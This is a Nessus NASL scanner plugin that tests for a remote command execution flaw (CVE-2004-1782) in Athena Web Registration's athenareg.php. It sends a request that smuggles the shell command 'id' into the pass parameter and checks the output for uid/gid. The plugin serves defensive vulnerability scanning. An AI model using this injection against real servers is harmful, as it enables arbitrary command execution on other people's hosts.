#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: Peter Kieser
# This script is released under the GNU GPL v2
#

 desc = "
The remote host is running Athena Web server.

The remote version of this software is vulnerable to remote command 
execution flaw through the athenareg.php script.

A malicious user could execute arbitrary commands on the remote host.

Solution: No update currently available, use another web server
Risk factor : High";


if(description)
{
 script_id(18376);
 script_bugtraq_id(9349);
 script_cve_id("CVE-2004-1782");
 if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:"16861");
  
 script_version("$Revision: 1.5 $");
 name["english"] = "Athena Web Registration remote command execution flaw";
 script_name(english:name["english"]);
 
 script_description(english:desc);
 
 summary["english"] = "Checks for Athena Web Registration remote command execution flaw";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


http_check_remote_code (
			check_request:"/athenareg.php?pass=%20;id",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc,
			port:port
			);
